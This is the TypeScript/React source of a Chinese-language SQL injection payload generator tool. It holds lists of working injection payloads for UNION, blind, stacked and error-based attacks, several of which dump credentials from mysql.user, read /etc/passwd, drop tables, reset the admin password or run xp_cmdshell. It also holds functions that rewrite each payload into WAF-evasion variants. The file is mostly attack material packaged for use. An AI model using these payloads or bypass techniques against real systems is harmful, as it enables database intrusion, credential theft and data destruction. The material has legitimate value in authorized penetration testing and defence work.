import SimpleTool from '../../_shared/SimpleTool';
import type { ToolProps } from '../../types';

const DB_OPTIONS = [
  { value: 'mysql', label: 'MySQL' },
  { value: 'postgresql', label: 'PostgreSQL' },
  { value: 'mssql', label: 'MSSQL' },
  { value: 'oracle', label: 'Oracle' },
  { value: 'sqlite', label: 'SQLite' },
];

const TYPE_OPTIONS = [
  { value: 'union', label: 'UNION 注入' },
  { value: 'boolean-blind', label: '布尔盲注' },
  { value: 'time-blind', label: '时间盲注' },
  { value: 'stacked', label: '堆叠查询' },
  { value: 'error', label: '报错注入' },
];

const BASE_PAYLOADS: Record<string, string[]> = {
  union: [
    "' UNION SELECT NULL-- -",
    "' UNION SELECT NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL-- -",
    "' UNION ALL SELECT 1,2,3-- -",
    "\" UNION SELECT NULL,NULL,NULL-- -",
    "' UNION SELECT user,password FROM mysql.user-- -",
    "' UNION SELECT table_name,NULL FROM information_schema.tables-- -",
    "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -",
    "' UNION SELECT load_file('/etc/passwd'),NULL-- -",
    "' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- -",
  ],
  'boolean-blind': [
    "' AND 1=1-- -",
    "' AND 1=2-- -",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -",
    "' AND SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)>'a'-- -",
    "' AND ASCII(SUBSTRING((SELECT user()),1,1))>100-- -",
    "\" AND IF(1=1,SLEEP(0),0)-- -",
    "' AND (SELECT length(database()))>5-- -",
    "' AND (SELECT length(table_name) FROM information_schema.tables LIMIT 1)>3-- -",
  ],
  'time-blind': [
    "' AND SLEEP(5)-- -",
    "' AND IF(1=1,SLEEP(5),0)-- -",
    "' AND (SELECT IF(SUBSTRING((SELECT user()),1,1)='r',SLEEP(5),0))-- -",
    "\" AND IF(1=1,SLEEP(5),0)-- -",
    "'; WAITFOR DELAY '0:0:5'-- -",
    "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -",
    "' AND IF(LENGTH(database())>5,SLEEP(5),0)-- -",
    "' AND IF(ASCII(SUBSTRING((SELECT user()),1,1))>100,SLEEP(5),0)-- -",
  ],
  stacked: [
    "'; SELECT * FROM users WHERE 1=1-- -",
    "'; INSERT INTO users(username,password) VALUES('admin','pwned')-- -",
    "'; UPDATE users SET password='hacked' WHERE username='admin'-- -",
    "'; DROP TABLE logs-- -",
    "'; EXEC xp_cmdshell('whoami')-- -",
    "'; SELECT pg_sleep(5)-- -",
    "'; CREATE TABLE tmp(data text); INSERT INTO tmp VALUES('test')-- -",
  ],
  error: [
    "' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -",
    "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)-- -",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -",
    "' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)),1)-- -",
    "' AND (SELECT * FROM (SELECT(NAME_CONST(version(),1)),NAME_CONST(version(),1))a)-- -",
    "' AND exp(~(SELECT * FROM(SELECT user())a))-- -",
  ],
};

const BYPASS_COMMENTS = [
  (p: string): string => p.replace(/\s+/g, '/**/'),
  (p: string): string => p.replace(/\s+/g, '/**_**/'),
  (p: string): string => p.replace(/\s+/g, '%23%0a'),
  (p: string): string => p.replace(/\s+/g, '--%0a'),
];

const bypassCase = (p: string): string =>
  p.replace(/\b(union|select|from|where|and|or|insert|update|delete|drop|sleep|if|count|concat|substring|ascii)\b/gi, (m: string): string => {
    let r = '';
    for (let i = 0; i < m.length; i++) {
      r += i % 2 === 0 ? m[i].toUpperCase() : m[i].toLowerCase();
    }
    return r;
  });

const bypassDouble = (p: string): string =>
  p.replace(/\b(union|select|from|where|and|or)\b/gi, (m: string): string => `${m}${m}`);

const bypassEnc = (p: string): string => encodeURIComponent(p);

const genVariants = (payload: string): string[] => {
  const variants: string[] = [payload];
  variants.push(`[大小写] ${bypassCase(payload)}`);
  variants.push(`[双写] ${bypassDouble(payload)}`);
  variants.push(`[URL编码] ${bypassEnc(payload)}`);
  BYPASS_COMMENTS.forEach((fn, i) => {
    const labels = ['注释/**/', '注释/**_**/', '注释%23%0a', '注释--%0a'];
    variants.push(`[${labels[i]}] ${fn(payload)}`);
  });
  return variants;
};

const generate = (db: string, type: string): string => {
  const base = BASE_PAYLOADS[type] ?? BASE_PAYLOADS.union;
  const lines: string[] = [
    `=== SQL注入 Payload（DB: ${db.toUpperCase()} / Type: ${type}）===`,
    '',
    '--- 基础 Payload ---',
    ...base,
    '',
    '--- WAF 绕过变体 ---',
  ];
  base.forEach((p, i) => {
    lines.push(`[${i + 1}] 原始: ${p}`);
    genVariants(p).slice(1).forEach((v) => lines.push(`     ${v}`));
  });

  const dbNote: Record<string, string> = {
    mysql: 'MySQL 特有: sleep()/benchmark()/load_file()/into outfile/@@version',
    postgresql: 'PostgreSQL 特有: pg_sleep()/copy to/CHR()/string_agg()',
    mssql: 'MSSQL 特有: WAITFOR DELAY/xp_cmdshell/convert()/sysobjects',
    oracle: 'Oracle 特有: DBMS_LOCK.SLEEP/utl_http/DBA_TABLES/dual',
    sqlite: 'SQLite 特有: sqlite_version()/sqlite_master/limit 偏移',
  };
  lines.push('', '--- 数据库特性提示 ---', dbNote[db] ?? dbNote.mysql);
  return lines.join('\n');
};

const ToolComponent = (props: ToolProps) => (
  <SimpleTool
    {...props}
    toolName="SQL注入Payload生成器"
    paramsConfig={[
      { name: 'db', label: '数据库', type: 'select', options: DB_OPTIONS, default: 'mysql' },
      { name: 'type', label: '注入类型', type: 'select', options: TYPE_OPTIONS, default: 'union' },
    ]}
    execute={(
      _input: string,
      _mode: string,
      params: Record<string, unknown>,
    ): string => generate(
      (params.db as string) ?? 'mysql',
      (params.type as string) ?? 'union',
    )}
  />
);

export default ToolComponent;
